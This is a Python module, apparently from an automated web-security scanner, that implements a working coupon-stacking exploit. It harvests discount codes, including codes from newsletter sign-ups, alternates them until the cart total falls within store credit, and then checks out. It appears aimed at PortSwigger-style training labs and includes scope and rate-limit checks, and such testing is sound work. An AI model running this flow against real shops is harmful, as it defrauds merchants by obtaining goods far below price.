"""
Coupon / discount abuse flow ("flawed enforcement of business rules").

Many shops block applying the *same* discount code twice but fail to stop you
from **alternating** between codes - so the discount stacks arbitrarily. This
flow: add the target to the cart, harvest every discount code it can see
(including codes revealed by newsletter/sign-up forms), then apply codes in an
alternating cycle, watching the cart total fall, until it drops within store
credit - then checks out and verifies the winning state.

General by construction: the coupon endpoint, codes, prices and credit are all
discovered; nothing about a specific lab is hard-coded.
"""

from __future__ import annotations

import logging
import re

from ..core.scope import Scope, ScopeError
from ..engine.auth import AuthManager
from ..engine.http_client import RateLimiter, ScopedClient
from ..testing.schema import Severity, TestCase, TestStep, VulnClass, Verdict

logger = logging.getLogger("venom.flows.coupon_stacking")

_CSRF = re.compile(r'name=["\']?csrf["\']?[^>]*?value=["\']?([^"\'\s>]+)')
_CODE = re.compile(r"\b[A-Z]{3,}\d+\b")
_CUR = re.compile(r"\$([\d,]+\.\d{2})")
_TOTAL = re.compile(r"(?is)total[^$]{0,40}\$([\d,]+\.\d{2})")


def _csrf(h: str | None) -> str | None:
    m = _CSRF.search(h or "")
    return m.group(1) if m else None


def _money(s: str) -> int:
    return int(round(float(s.replace(",", "")) * 100))


def _total_of(html: str) -> int:
    m = _TOTAL.search(html or "")
    if m:
        return _money(m.group(1))
    curs = _CUR.findall(html or "")
    return _money(curs[-1]) if curs else 10 ** 9


def _find_coupon_ep(registry) -> str | None:
    for e in registry:
        if e.method.upper() == "POST" and "coupon" in e.path.lower():
            return e.path
    for e in registry:
        if any(p.name.lower() == "coupon" for p in e.parameters):
            return e.path
    return None


def _coupon_from_html(html: str) -> str | None:
    """Detect a coupon endpoint from a live cart page (the form only renders when
    the cart has items, so the crawler never saw it)."""
    m = re.search(r'action=["\']?([^"\' >]*coupon[^"\' >]*)', html or "")
    if m:
        return m.group(1)
    return "/cart/coupon" if re.search(r'name=["\']?coupon', html or "") else None


async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
    # Run on any shop with an add-to-cart form; detect the coupon endpoint AFTER
    # adding an item (it isn't rendered on an empty cart, so discovery misses it).
    cart_path = next((e.path for e in registry if e.method.upper() == "POST"
                      and "cart" in e.path.lower()
                      and any(p.name.lower() in ("quantity", "qty") for p in e.parameters)), None)
    if cart_path is None and not registry.catalog:
        return []
    cart_path = cart_path or "/cart"
    checkout = "/cart/checkout"
    target = max(registry.catalog, key=registry.catalog.get) if registry.catalog else "1"
    credit = registry.store_credit or 10000
    limiter = RateLimiter(scope.rate_limit_per_second)

    try:
        lab = ScopedClient(scope, scope.authorized_base_urls[0], role="coupon",
                           limiter=limiter, transport=transport)
    except ValueError:
        return []
    if scope.identities:
        try:
            lab.apply_auth(await AuthManager(scope, transport=transport).ensure(scope.identities[0]["name"]))
        except Exception as exc:  # noqa: BLE001
            logger.warning("coupon flow auth failed: %s", exc)

    steps: list[TestStep] = []
    try:
        # 1. Put the target in the cart, then look for the coupon endpoint live.
        await lab.request("POST", cart_path, data={"productId": target, "redir": "PRODUCT",
                                                   "quantity": "1"}, follow_redirects=True)
        cart0 = await lab.request("GET", "/cart", follow_redirects=True)
        coupon_ep = _find_coupon_ep(registry) or _coupon_from_html(cart0.text if cart0 else "")
        if not coupon_ep:
            return []   # not a discount-code shop
        steps.append(TestStep(step=1, description=f"add target product {target} to cart",
                              method="POST", path=cart_path))

        # 2. Harvest discount codes (visible + revealed by sign-up/newsletter forms).
        home = (await lab.request("GET", "/", follow_redirects=True))
        home_html = home.text if home else ""
        codes: list[str] = []
        for code in _CODE.findall(home_html):
            if code not in codes:
                codes.append(code)
        for m in re.finditer(r"(?is)<form[^>]*action=['\"]?([^'\" >]+)['\"]?[^>]*>(.*?)</form>", home_html):
            action, body = m.group(1), m.group(2)
            if "email" in body.lower() and not any(x in action.lower() for x in
                                                   ("login", "register", "cart", "coupon", "checkout", "change")):
                r = await lab.request("POST", action, data={"csrf": _csrf(home_html),
                                                            "email": "venom@newsletter.test"},
                                      follow_redirects=True)
                for code in _CODE.findall(r.text if r else ""):
                    if code not in codes:
                        codes.append(code)
        steps.append(TestStep(step=2, description=f"harvest discount codes: {codes}",
                              method="GET", path="/"))
        if not codes:
            return []

        async def read_cart():
            t = (await lab.request("GET", "/cart", follow_redirects=True))
            html = t.text if t else ""
            return _total_of(html), _csrf(html)

        # 3. Apply codes in an alternating cycle until the total is affordable.
        total, csrf = await read_cart()
        start_total, last, stalls, i = total, None, 0, 0
        while total > credit and i < 40:
            cands = [c for c in codes if c != last] or codes
            code = cands[i % len(cands)]
            await lab.request("POST", coupon_ep, data={"csrf": csrf, "coupon": code},
                              follow_redirects=True)
            new_total, csrf = await read_cart()
            stalls = stalls + 1 if new_total >= total else 0
            last, total, i = code, new_total, i + 1
            if stalls >= max(2, len(codes)):
                break
        steps.append(TestStep(step=3, description=f"alternate coupons {start_total}->{total} (credit {credit})",
                              method="POST", path=coupon_ep))

        # 4. Check out and verify.
        cr = await lab.request("POST", checkout, data={"csrf": csrf}, follow_redirects=True)
        steps.append(TestStep(step=4, description="checkout", method="POST", path=checkout,
                              actual_status=getattr(cr, "status_code", None)))
        home2 = await lab.request("GET", "/", follow_redirects=True)
        solved = bool(home2 and "is-solved" in (home2.text or ""))
        ordered = bool(cr and "order" in (cr.text or "").lower() and total <= credit)
        if not (solved or ordered):
            return []

        return [TestCase(
            test_id="CPN-001",
            vulnerability_class=VulnClass.ECONOMIC_ABUSE,
            hypothesis=("Flawed enforcement of business rules: discount codes can be stacked by "
                        f"alternating them ({codes}), dropping the total from {start_total} to "
                        f"{total} (minor units) - within store credit."),
            risk_rating=Severity.HIGH,
            affected_endpoint=f"POST {coupon_ep}",
            business_impact="Buy expensive goods far below price via unlimited stacked discounts.",
            steps=steps,
            origin="flow",
            verdict=Verdict.CONFIRMED_EXPLOIT,
            notes=["LAB SOLVED (is-solved)" if solved else "order placed within credit via stacked coupons"],
            rag_source="PortSwigger: Flawed enforcement of business rules / WSTG-BUSL-07",
        )]
    except ScopeError as exc:
        logger.warning("coupon flow blocked by scope: %s", exc)
        return []
    finally:
        await lab.aclose()
